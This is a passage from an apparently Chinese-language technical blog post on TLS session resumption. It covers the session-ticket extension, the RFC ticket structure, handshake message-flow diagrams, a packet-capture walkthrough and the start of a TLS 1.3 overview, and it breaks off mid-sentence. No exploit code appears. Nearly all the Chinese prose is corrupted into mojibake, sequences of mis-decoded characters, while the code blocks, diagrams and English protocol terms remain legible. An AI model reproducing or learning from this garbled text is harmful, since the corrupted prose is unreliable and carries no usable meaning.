5077)æ›¿æ¢æœºåˆ¶ï¼Œå®ƒå–æ¶ˆäº†æœåŠ¡å™¨ä¿ç•™æ¯ä¸ªå®¢æˆ·ç«¯ä¼šè¯çŠ¶æ€çš„è¦æ±‚ã€‚å–è€Œä»£ä¹‹çš„æ˜¯ï¼Œå¦‚æœå®¢æˆ·ç«¯è¡¨ç¤ºæ”¯æŒä¼šè¯ç¥¨ï¼ŒæœåŠ¡å™¨å¯ä»¥åŒ…å«ä¸€ä¸ªä¼šè¯ç¥¨è®°å½•ï¼Œå…¶ä¸­åŒ…æ‹¬æ‰€æœ‰ç”¨åªæœ‰æœåŠ¡å™¨çŸ¥é“çš„ç§˜å¯†å¯†é’¥åŠ å¯†çš„åå•†ä¼šè¯æ•°æ®ã€‚ç„¶åï¼Œè¯¥ä¼šè¯ç¥¨ç”±å®¢æˆ·ç«¯å­˜å‚¨ï¼Œå¹¶ä¸”å¯ä»¥åŒ…å«åœ¨åç»­ä¼šè¯çš„æ¡æ‰‹æ¶ˆæ¯ä¸­ã€‚å› æ­¤ï¼Œæ‰€æœ‰çš„ä¼šè¯æ•°æ®åªå­˜å‚¨åœ¨å®¢æˆ·ç«¯ï¼Œä½†ç¥¨æ®ä»ç„¶æ˜¯å®‰å…¨çš„ï¼Œå› ä¸ºå®ƒæ˜¯ç”¨åªæœ‰æœåŠ¡å™¨çŸ¥é“çš„å¯†é’¥åŠ å¯†çš„ã€‚</p><p>ä¼šè¯ç¥¨æœºåˆ¶è¢«ç§°ä¸ºæ— çŠ¶æ€æ¢å¤æœºåˆ¶ã€‚æ— çŠ¶æ€æ¢å¤æœºåˆ¶çš„ä¸»è¦æ”¹è¿›æ˜¯å–æ¶ˆäº†æœåŠ¡å™¨ç«¯çš„ä¼šè¯ç¼“å­˜ï¼Œç®€åŒ–äº†éƒ¨ç½²ï¼Œè¦æ±‚å®¢æˆ·ç«¯åœ¨æ¯æ¬¡ä¸æœåŠ¡å™¨çš„æ–°è¿æ¥æ—¶æä¾›ä¼šè¯ç¥¨æ®ï¼Œç›´åˆ°ç¥¨æ®è¿‡æœŸã€‚</p><p>TLS SessionTicket æ˜¯ä¸€ä¸ªæ‰©å±•ï¼Œå…¶åŸºäº <a href="https://tools.ietf.org/html/rfc4366" target="_blank" rel="noopener">RFC4366</a> ã€‚Ticket çš„æ ¼å¼æ˜¯ä¸€ä¸ª opaque çš„ç»“æ„ï¼Œç”¨äºæºå¸¦ç‰¹å®šä¼šè¯çš„çŠ¶æ€ä¿¡æ¯ã€‚RFC æ¨èçš„ Session Ticket ç»“æ„å¦‚ä¸‹ï¼š</p><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">struct {</span><br><span class="line">  <span class="hljs-built_in">uint</span>32 ticket_lifetime_hint;</span><br><span class="line">  opaque ticket&lt;<span class="hljs-number">0.</span><span class="hljs-number">.2</span>^<span class="hljs-number">16</span><span class="hljs-number">-1</span>&gt;;</span><br><span class="line">} NewSessionTicket;</span><br><span class="line"></span><br><span class="line">struct {</span><br><span class="line">  opaque key_name[<span class="hljs-number">16</span>];</span><br><span class="line">  opaque iv[<span class="hljs-number">16</span>];</span><br><span class="line">  opaque encrypted_state&lt;<span class="hljs-number">0.</span><span class="hljs-number">.2</span>^<span class="hljs-number">16</span><span class="hljs-number">-1</span>&gt;;</span><br><span class="line">  opaque mac[<span class="hljs-number">32</span>];</span><br><span class="line">} ticket;</span><br></pre></td></tr></tbody></table></figure><p></p><p>è¿™ä¸ªæ‰©å±•å¯ä»¥åœ¨ ClientHello å’Œ ServerHello ä¸­å‘é€ã€‚å¦‚æœå®¢æˆ·ç«¯æ‹¥æœ‰ä¸€ä¸ªæƒ³è¦ç”¨æ¥æ¢å¤ä¼šè¯çš„ ticketï¼Œé‚£ä¹ˆå®ƒå°±ä¼šåœ¨ ClientHello ä¸­çš„ SessionTicket æ‰©å±•ä¸­åŒ…å«è¿™ä¸ª ticketã€‚å¦‚æœå®¢æˆ·ç«¯æ²¡æœ‰ç¥¨æ®ï¼Œå¹¶ä¸”å‡†å¤‡åœ¨ NewSessionTicket æ¡æ‰‹æ¶ˆæ¯ä¸­æ¥æ”¶ç¥¨æ®ï¼Œé‚£ä¹ˆå®ƒå¿…é¡»åœ¨ SessionTicket æ‰©å±•ä¸­åŒ…å«ä¸€ä¸ªé•¿åº¦ä¸ºé›¶çš„ Session Ticket ã€‚å¦‚æœå®¢æˆ·ç«¯ä¸å‡†å¤‡åœ¨ NewSessionTicket æ¡æ‰‹æ¶ˆæ¯ä¸­æ¥æ”¶ç¥¨æ®ï¼Œåˆ™å¿…é¡»ä¸åŒ…å« SessionTicket æ‰©å±•ï¼Œé™¤éå®¢æˆ·ç«¯å‘é€é€šè¿‡å…¶ä»–æ–¹å¼ä»æœåŠ¡å™¨æ”¶åˆ°çš„éç©ºç¥¨æ®ã€‚</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">     <span class="hljs-built_in"> Client </span>                                              Server</span><br><span class="line"></span><br><span class="line">      ClientHello</span><br><span class="line">     (empty SessionTicket extension)--------&gt;</span><br><span class="line">                                                      ServerHello</span><br><span class="line">                                  (empty SessionTicket extension)</span><br><span class="line">                                                     Certificate*</span><br><span class="line">                                               ServerKeyExchange*</span><br><span class="line">                                              CertificateRequest*</span><br><span class="line">                                   &lt;--------      ServerHelloDone</span><br><span class="line">      Certificate*</span><br><span class="line">      ClientKeyExchange</span><br><span class="line">      CertificateVerify*</span><br><span class="line">      [ChangeCipherSpec]</span><br><span class="line">      Finished                     --------&gt;</span><br><span class="line">                                                 NewSessionTicket</span><br><span class="line">                                               [ChangeCipherSpec]</span><br><span class="line">                                   &lt;--------             Finished</span><br><span class="line">      Application Data             &lt;-------&gt;     Application Data</span><br><span class="line"></span><br><span class="line">Figure 1: Message Flow <span class="hljs-keyword">for</span> Full Handshake Issuing New Session Ticket</span><br></pre></td></tr></tbody></table></figure><p></p><p>å¦‚ä¸Šæµç¨‹å›¾æ‰€ç¤ºï¼Œå®¢æˆ·ç«¯é€šè¿‡åœ¨ ClientHello æ¶ˆæ¯ä¸­åŒ…å«ä¸€ä¸ª SessionTicket TLS æ‰©å±•åæ¥è¡¨ç¤ºå®ƒæ”¯æŒè¿™ç§æœºåˆ¶ï¼Œæ­¤æ—¶ SessionTicket ä¸ºç©ºï¼ŒæœåŠ¡å™¨å°†å‘é€ä¸€ä¸ªç©ºçš„SessionTicket æ‰©å±•æ¥è¡¨ç¤ºå®ƒå°†ä½¿ç”¨ NewSessionTicket æ¡æ‰‹æ¶ˆæ¯å‘é€ä¸€ä¸ªæ–°çš„ Session Ticketï¼Œè¯¥æ¶ˆæ¯æ˜¯åœ¨æœåŠ¡å™¨æˆåŠŸéªŒè¯å®¢æˆ·ç«¯çš„ Finished æ¶ˆæ¯åï¼Œåœ¨ChangeCipherSpec æ¶ˆæ¯ä¹‹å‰çš„ TLS æ¡æ‰‹æœŸé—´å‘é€ã€‚åœ¨å¾—åˆ° Session Ticket åï¼ŒClient å°†è¯¥ Session Ticket ä¸ä¸»å¯†å’Œå…¶ä»–ä¸å½“å‰ä¼šè¯ç›¸å…³çš„å‚æ•°ä¸€èµ·ç¼“å­˜ã€‚</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    <span class="hljs-built_in"> Client </span>                                               Server</span><br><span class="line">     ClientHello</span><br><span class="line">     (SessionTicket extension)      --------&gt;</span><br><span class="line">                                                      ServerHello</span><br><span class="line">                                  (empty SessionTicket extension)</span><br><span class="line">                                                 NewSessionTicket</span><br><span class="line">                                               [ChangeCipherSpec]</span><br><span class="line">                                   &lt;--------             Finished</span><br><span class="line">     [ChangeCipherSpec]</span><br><span class="line">     Finished                      --------&gt;</span><br><span class="line">     Application Data              &lt;-------&gt;     Application Data</span><br><span class="line"></span><br><span class="line">Figure 2: Message Flow <span class="hljs-keyword">for</span> Abbreviated Handshake Using New Session</span><br><span class="line">                              Ticket</span><br></pre></td></tr></tbody></table></figure><p></p><p>å½“å®¢æˆ·ç«¯å¸Œæœ›æ¢å¤ä¼šè¯æ—¶ï¼Œå®ƒåœ¨ ClientHello æ¶ˆæ¯ä¸­çš„ SessionTicket æ‰©å±•ä¸­åŒ…å«è¯¥ç¥¨æ®ã€‚ç„¶åæœåŠ¡å™¨å¯¹æ”¶åˆ°çš„ç¥¨æ®è¿›è¡Œè§£å¯†ï¼ŒéªŒè¯ç¥¨æ®çš„æœ‰æ•ˆæ€§ï¼Œä»ç¥¨æ®çš„å†…å®¹ä¸­æ£€ç´¢ä¼šè¯çŠ¶æ€ï¼Œå¹¶ä½¿ç”¨è¿™ä¸ªçŠ¶æ€æ¥æ¢å¤ä¼šè¯ã€‚å¦‚æœæœåŠ¡å™¨æˆåŠŸéªŒè¯äº†å®¢æˆ·ç«¯çš„ç¥¨æ®ï¼Œé‚£ä¹ˆå°±å¯ä»¥åœ¨ ServerHello ä¹‹ååŠ å…¥ NewSessionTicket æ¡æ‰‹æ¶ˆæ¯æ¥ç»­è®¢ç¥¨æ®ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å®ä¾‹æ¥è¿›ä¸€æ­¥äº†è§£è¿™ä¸ªæœºåˆ¶ï¼š</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1-1/4.jpeg" alt=""></p><p>å®¢æˆ·ç«¯é¦–å…ˆé€šè¿‡åœ¨ Client Hello æ¶ˆæ¯ä¸­æ·»åŠ  SessionTickets TLS Extension æ¥è¡¨æ˜å®ƒæ”¯æŒæ— çŠ¶æ€ä¼šè¯æ¢å¤ï¼ˆç»¿è‰²éƒ¨åˆ†ï¼‰ï¼Œ Server è¿˜ä¼šé€šè¿‡å‘é€åŒ…å«æœ‰ç©ºçš„ SessionTicket TLS Extension çš„ Server Hello æ¶ˆæ¯ç»™ Client ï¼Œè¡¨ç¤º Server æ”¯æŒ SessionTicket TLS Extensionï¼ˆçº¢è‰²éƒ¨åˆ†ï¼‰ã€‚</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1-1/5.jpeg" alt=""></p><p>åœ¨æ¡æ‰‹å®Œæˆä¹‹å‰ï¼Œä¹Ÿå°±æ˜¯ Finished ä¹‹å‰ï¼ŒServer ä¼šå‘é€ä¸€ä¸ªåä¸º New Session Ticket çš„æ–° TLS æ¶ˆæ¯ï¼Œå…¶ä¸­åŒ…å«åŠ å¯†çš„ä¼šè¯ä¿¡æ¯ï¼ˆå¦‚ä¸»å¯†ã€ä½¿ç”¨çš„å¯†ç ç­‰ï¼‰ï¼ŒServer å¯ä»¥åœ¨ç¨åä½¿ç”¨å®ƒä¸“é—¨ä¸ºæ­¤ç”Ÿæˆçš„å”¯ä¸€å¯†é’¥è¿›è¡Œè§£å¯†ã€‚ä»è¿™ä¸€ç‚¹å¼€å§‹ï¼ŒClient ä¼šå°† Session Ticket ä¿å­˜åœ¨å®ƒçš„ TLS ç¼“å­˜ä¸­ï¼Œç›´åˆ°ä¸‹ä¸€æ¬¡å®ƒåœ¨ Session Ticketè¿‡æœŸä¹‹å‰éƒ½å¯ä»¥ä½¿ç”¨å®ƒä¸ä¹‹å‰çš„ Server æ¢å¤ TLS ä¼šè¯ã€‚</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1-1/6.jpeg" alt=""></p><p>ç°åœ¨ï¼Œå½“ Client æƒ³è¦é‡æ–°ä½¿ç”¨ä¹‹å‰çš„ä¼šè¯æ—¶ï¼Œå®ƒåœ¨ Client Hello æ¶ˆæ¯çš„ SessionTicket TLS Extension ä¸­å‘é€äº† Session Ticketï¼Œæ­¤æ—¶æˆ‘ä»¬æ‰€æ³¨æ„åˆ°ï¼Œå®¢æˆ·ç«¯ä¹Ÿåˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ä¼šè¯ ID ï¼Œç”¨äºä»¥ä¸‹ç›®çš„ï¼š</p><ul><li>æœåŠ¡å™¨å›å¤ç›¸åŒçš„ Session ID è¡¨ç¤º Server æ¥å— Session Ticket ï¼Œå¹¶å°†é‡ç”¨è¯¥ Session ã€‚</li><li>æœåŠ¡å™¨å›å¤ç©ºçš„/ä¸åŒçš„ Session ID ï¼šServer å†³å®šè¿›è¡Œå®Œå…¨æ¡æ‰‹ï¼ŒåŸå› æ˜¯å¯èƒ½æ˜¯ Session Ticket è¿‡æœŸäº†ï¼Œæˆ–è€…å®ƒæ­£åœ¨æ¢å¤åŸæ¥çš„ä¼šè¯ã€‚<br>PSï¼šè¿™æ ·çš„ Session ID å¹¶ä¸å­˜å‚¨åœ¨ Server ä¸Šï¼Œå¦åˆ™ä¼šç ´åæ— çŠ¶æ€ä¼šè¯é‡ç”¨çš„ç›®çš„ã€‚è¿™æ˜¯ä¸€æ¬¡æ€§ä½¿ç”¨ï¼Œåªæ˜¯ä¸ºäº†å‘ Client è¡¨ç¤º Server æ¥å—äº†ä»–ä»¬å‘é€çš„session ticketã€‚</li></ul><p>åœ¨ä¸Šè¿°çš„ä¾‹å­ä¸­ï¼ŒServer æˆåŠŸæ¥å—å¹¶é‡ç”¨äº† TLS ä¼šè¯ï¼Œæˆ‘ä»¬å¯ä»¥ç¡®è®¤è¿›è¡Œäº†ä¸€ä¸ª Abbreviated TLS æ¡æ‰‹ï¼Œå¹¶ä¸”åœ¨æœåŠ¡å™¨çš„ Server Hello æ¶ˆæ¯ä¸­ï¼ŒServer å›å¤äº†å®¢æˆ·ç«¯å‘é€çš„ç›¸åŒ Session ID ã€‚è¿™å°±æ˜¯ä¸€ä¸ªç®€å•çš„åŸºäº Session Ticket æœºåˆ¶çš„ Session Resumption ï¼ŒæœåŠ¡ç«¯ä¸éœ€è¦åœ¨æœ¬åœ°å­˜å‚¨ä¼šè¯ä¿¡æ¯ï¼Œå› æ­¤ä¸æœ‰çŠ¶æ€çš„ä¼šè¯æ¢å¤ç›¸æ¯”ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ›´å…·æ‰©å±•æ€§çš„é€‰æ‹©ã€‚</p><h3 id="TLS-1-3"><a href="#TLS-1-3" class="headerlink" title="TLS 1.3"></a>TLS 1.3</h3><h4 id="TLS-1-3-Overview"><a href="#TLS-1-3-Overview" class="headerlink" title="TLS 1.3 Overview"></a>TLS 1.3 Overview</h4><p>TLS 1.3 å¯ä»¥è¯´æ˜¯ TLS 1.2 çš„å‡çº§ç‰ˆæœ¬ï¼Œå®ƒåœ¨ RFC 8446 ä¸­å®šä¹‰ï¼Œäº 2018 å¹´ 8 æœˆå‘è¡¨ã€‚æˆ‘ä»¬è¿™é‡Œç®€è¦çš„ä»‹ç»å‡ ä¸ªæˆ‘ä»¬æ¯”è¾ƒå…³å¿ƒçš„æ”¹åŠ¨ï¼š</p><ul><li>å‡å°‘æ¡æ‰‹ç­‰å¾…æ—¶é—´ï¼Œå°†æ¡æ‰‹æ—¶é—´ä» 2-RTT é™ä½åˆ° 1-RTTï¼Œå¹¶ä¸”å¢åŠ  0-RTT æ¨¡å¼ã€‚</li><li>åºŸé™¤ Session ID å’Œ Session Ticket ä¼šè¯æ¢å¤æ–¹å¼ï¼Œç»Ÿä¸€é€šè¿‡ PSK çš„æ–¹å¼è¿›è¡Œä¼šè¯æ¢å¤ï¼Œå¹¶åœ¨ NewSessionTicket æ¶ˆæ¯ä¸­æ·»åŠ è¿‡æœŸæ—¶é—´å’Œç”¨äºæ··æ·†æ—¶é—´çš„åç§»å€¼ã€‚</li></ul><p>åœ¨æ¡æ‰‹æ—¶ç›¸å¯¹äº TLS 1.2 å‘ç”Ÿäº†æ¯”è¾ƒæ˜æ˜¾çš„æ”¹åŠ¨ï¼š</p><ol><li>ä¸ TLS 1.2 æ¡æ‰‹ç±»ä¼¼ï¼ŒTLS 1.3 æ¡æ‰‹ä»¥ Client Hello æ¶ˆæ¯å¼€å§‹ï¼Œä½†æœ‰ä¸€ä¸ªé‡è¦çš„å˜åŒ–å°±æ˜¯å®¢æˆ·ç«¯å‘é€æ”¯æŒçš„åŠ å¯†å¥—ä»¶åˆ—è¡¨ï¼Œå¹¶çŒœæµ‹æœåŠ¡å™¨å¯èƒ½é€‰æ‹©çš„å¯†é’¥åè®®åè®®ï¼Œä¹Ÿä¼šå‘é€å®ƒå¯¹è¯¥ç‰¹å®šå¯†é’¥åè®®åè®®çš„å¯†é’¥å…±äº«ã€‚</li><li>Server 